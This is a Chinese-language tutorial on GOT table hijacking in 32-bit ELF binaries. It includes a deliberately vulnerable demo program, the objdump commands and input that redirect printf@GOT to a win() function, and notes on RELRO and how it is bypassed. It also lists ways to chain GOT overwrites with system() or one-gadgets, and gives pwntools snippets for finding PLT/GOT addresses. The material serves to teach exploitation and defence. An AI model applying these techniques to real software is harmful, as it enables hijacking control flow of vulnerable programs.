# GOT表劫持

前面了解了动态链接和延迟绑定的概念。针对GOT表延迟绑定，有一种常见攻击方式是GOT表劫持。



### GOT表劫持

```
$ readelf -S ropasaurusrex 
There are 28 section headers, starting at offset 0x724:

Section Headers:
 [Nr] Name       Type      Addr   Off  Size  ES Flg Lk Inf Al
 ...
 [23] .got.plt     PROGBITS    08049604 000604 00001c 04 WA 0  0 4         # 这里flag带W，说明可写
 ...
Key to Flags:
 W (write), A (alloc), X (execute), M (merge), S (strings),
 I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown),
 O (extra OS processing required), o (OS specific), p (processor specific)
```

   - 延迟绑定机制要求GOT表必须可写
   - 内存漏洞可导致GOT表项被改写，从而劫持PC

![GOT HIJACKING](images/ELF文件与动态链接/got_hijack2.png)

![GOT HIJACKING](images/ELF文件与动态链接/got_hijack3.png)

![GOT HIJACKING](images/ELF文件与动态链接/got_hijack4.png)

   实例：GOT表劫持

```
#include <stdlib.h>
#include <stdio.h>

void win() {
  puts("You Win!");
}

void main() {
  unsigned int addr, value;
  scanf("%x=%x", &addr, &value);
  *(unsigned int *)addr = value;
  printf("set %x=%x\n", addr, value);
}
```

编译: gcc got_hijacking.c -m32 -o got_hijacking

程序允许修改任意四字节，如何执行win函数呢？main函数在修改内存后调用了printf函数，因此可以考虑修改printf的GOT表项，将其劫持到win()函数。

```
$ objdump -R got_hijacking | grep printf        # 查询printf@GOT表地址
0804a00c R_386_JUMP_SLOT    printf@GLIBC_2.0
$ objdump -d got_hijacking | grep win           # objdump -d反汇编，查询win()函数地址
0804848b <win>:
$ ./got_hijacking
0804a00c=0804848b                               # 劫持printf@GOT表项为win()函数地址
You Win!
```


### 如何防御GOT表劫持

   - 重定位只读 (Relocation Read Only) 缓解措施
     * 编译选项：gcc -z,relro
     * 在进入main()之前，所有的外部函数都会被解析
     * 所有GOT表设置为只读
     * 绕过方法
       + 劫持未开启该保护的动态库中的GOT表(例如libc中的GOT表)
       + 改写函数返回地址或函数指针



## 补充

### GOT表劫持应用场景与组合利用

GOT覆写是一项用途广泛的技巧，在栈溢出或堆溢出等场景中经常会用来构成攻击链的一部分。当我们通过某些漏洞，拥有了任意地址写的能力，就可以使用GOT表覆写完成利用。通常通过读取GOT表可以实现leak libc，写GOT表可以实现GOT hijack。

一些场景示例：

1. 缓冲区溢出构造ROP调用write@plt读取GOT，调用read@plt覆写GOT

2. 堆溢出或堆UAF漏洞可以控制分配内存到GOT上从而可以进行GOT表劫持

3. 栈上或堆上数组越界导致的任意地址写覆写GOT

4. 格式化字符串漏洞覆写GOT

5. scanf误用如scanf("%d", value)写入操作数没有取地址，通过控制value值即可实现任意地址写

6. GOT劫持多数场景使用libc中system地址覆写，如覆写free@got或strlen@got等，当调用free('/bin/sh')或strlen('/bin/sh')实际调用的是system()

7. GOT劫持覆写GOT表项为one gadget

8. 使用程序本身使用的printf@plt覆写GOT表项可以构造格式化字符串漏洞，plt函数地址在PIE关闭情况下是固定的，这样不需要leak libc也能实现GOT劫持

   

### 定位plt_write和got_write地址

plt_write和got_write都可以通过objdump读取，如下：

```
 $ objdump -d -j .plt level2

 Disassembly of section .plt:

 08048310 <read@plt>:
  8048310: ff 25 00 a0 04 08 jmp *0x804a000
  8048316: 68 00 00 00 00 push $0x0
  804831b: e9 e0 ff ff ff jmp 8048300 <_init+0x30>

 08048320 <__gmon_start__@plt>:
  8048320: ff 25 04 a0 04 08 jmp *0x804a004
  8048326: 68 08 00 00 00 push $0x8
  804832b: e9 d0 ff ff ff jmp 8048300 <_init+0x30>

 08048330 <__libc_start_main@plt>:
  8048330: ff 25 08 a0 04 08 jmp *0x804a008
  8048336: 68 10 00 00 00 push $0x10
  804833b: e9 c0 ff ff ff jmp 8048300 <_init+0x30>

 08048340 <write@plt>:
  8048340: ff 25 0c a0 04 08 jmp *0x804a00c
  8048346: 68 18 00 00 00 push $0x18
  804834b: e9 b0 ff ff ff jmp 8048300 <_init+0x30>
```

```
 $ objdump -R level2
 //got表
 DYNAMIC RELOCATION RECORDS
 OFFSET TYPE VALUE
 08049ff0 R_386_GLOB_DAT __gmon_start__
 0804a000 R_386_JUMP_SLOT read
 0804a004 R_386_JUMP_SLOT __gmon_start__
 0804a008 R_386_JUMP_SLOT __libc_start_main
 0804a00c R_386_JUMP_SLOT write
```

可以看到plt_write值为0x08048340，got_write值为0x804a00c，当然相关实现也已封装到pwntool中，一个调用即可自动获取：

```
 elf = ELF('level2')
 plt_write = elf.symbols['write']
 got_write = elf.got['write']
```

